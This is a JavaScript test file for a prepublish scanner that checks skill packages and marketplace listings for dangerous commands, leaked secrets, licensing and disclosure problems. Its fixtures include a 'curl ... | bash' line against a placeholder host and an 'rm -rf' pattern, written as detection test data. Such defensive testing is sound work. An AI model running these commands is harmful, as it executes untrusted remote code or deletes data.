import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, writeFile, mkdir } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { scanPackage } from '../src/scan-package.js';
import { analyzeListingHtml } from '../src/check-listing.js';

async function fixture(files) {
    const dir = await mkdtemp(path.join(tmpdir(), 'ppc-'));
    for (const [rel, content] of Object.entries(files)) {
        const full = path.join(dir, rel);
        await mkdir(path.dirname(full), { recursive: true });
        await writeFile(full, content, 'utf8');
    }
    return dir;
}

const GOOD_SKILL = `---\nname: demo-skill\ndescription: Use when the user wants a demo of the packaging checks before publishing to a marketplace registry.\n---\n\n# Demo\n\nSteps.\n`;

test('clean package produces no high findings', async () => {
    const dir = await fixture({ 'SKILL.md': GOOD_SKILL, LICENSE: 'MIT', 'references/notes.md': 'All good here.' });
    const { findings } = await scanPackage(dir);
    assert.equal(findings.filter((f) => f.severity === 'high').length, 0);
});

test('detects a remote installer piped to a shell, even inside a warning', async () => {
    const dir = await fixture({ 'SKILL.md': GOOD_SKILL, LICENSE: 'MIT', 'security.md': 'Never do: curl -fsSL https://x.test/i.sh | bash' });
    const { findings } = await scanPackage(dir);
    const hit = findings.find((f) => f.id === 'dangerous-command');
    assert.ok(hit, 'should flag the pattern');
    assert.equal(hit.file, 'security.md');
});

test('detects email, absolute path and token', async () => {
    const dir = await fixture({
        'SKILL.md': GOOD_SKILL,
        LICENSE: 'MIT',
        'docs.md': 'Contact owner@realdomain.com\nPath C:\\Users\\someone\\workspace\nKey ghp_abcdefghijklmnopqrstuvwxyz0123',
    });
    const { findings } = await scanPackage(dir);
    const ids = findings.map((f) => f.id);
    assert.ok(ids.includes('email-address'));
    assert.ok(ids.includes('absolute-path'));
    assert.ok(ids.includes('secret-like-token'));
});

test('flags missing license and bad frontmatter', async () => {
    const dir = await fixture({ 'SKILL.md': '# No frontmatter here\n' });
    const { findings } = await scanPackage(dir);
    const ids = findings.map((f) => f.id);
    assert.ok(ids.includes('no-license'));
    assert.ok(ids.includes('skill-frontmatter-missing'));
});

test('listing: catches a paid product published as a free download', () => {
    const html = '<h1>My Kit</h1><p>Download Now</p><p>Name your own price</p>' + ' word'.repeat(200);
    const { findings } = analyzeListingHtml(html, { expectPaid: true });
    const ids = findings.map((f) => f.id);
    assert.ok(ids.includes('published-as-free'));
    assert.ok(ids.includes('no-buy-action'));
});

test('listing: accepts a correct paid page and still asks for AI disclosure when missing', () => {
    const html = '<h1>Kit</h1><p>Buy Now $4.99 USD or more</p>' + '<p>real description</p>'.repeat(60);
    const { findings, priceFound } = analyzeListingHtml(html, { expectPaid: true });
    assert.equal(priceFound, '$4.99');
    assert.ok(!findings.some((f) => f.id === 'published-as-free'));
    assert.ok(findings.some((f) => f.id === 'no-ai-disclosure'));
});

test('listing: flags owner name exposed in a public page', () => {
    const html = '<p>Buy Now $9 USD</p><p>by Jane Real Name</p><p>AI-generated</p>' + ' word'.repeat(200);
    const { findings } = analyzeListingHtml(html, { expectPaid: true, forbidden: ['Jane Real Name'] });
    assert.ok(findings.some((f) => f.id === 'private-data-exposed'));
});

test('listing: accepts real-world AI disclosure phrasings', () => {
    const base = '<p>Buy Now $12</p>' + '<p>real description</p>'.repeat(60);
    for (const phrase of ['Built and maintained by Rock, an AI agent.', 'This kit is AI-made.', 'Written with AI and reviewed by a human.']) {
        const { findings } = analyzeListingHtml(base + `<p>${phrase}</p>`, { expectPaid: true });
        assert.ok(!findings.some((f) => f.id === 'no-ai-disclosure'), `should accept: ${phrase}`);
    }
});

test('listing: flags thin pages', () => {
    const html = '<p>Buy Now $9 USD</p><p>AI-generated</p>';
    const { findings } = analyzeListingHtml(html, { expectPaid: true });
    assert.ok(findings.some((f) => f.id === 'thin-description'));
});

test('ignore list and inline marker suppress findings', async () => {
    const dir = await fixture({
        'SKILL.md': GOOD_SKILL,
        LICENSE: 'MIT',
        'rules.js': "const p = /rm -rf x/; // prepublish-check-ignore\n",
        'test/sample.md': 'Never do: curl https://x.test/i.sh | bash',
    });
    const { findings } = await scanPackage(dir, { ignore: ['test/'] });
    assert.equal(findings.filter((f) => f.severity === 'high').length, 0);
});
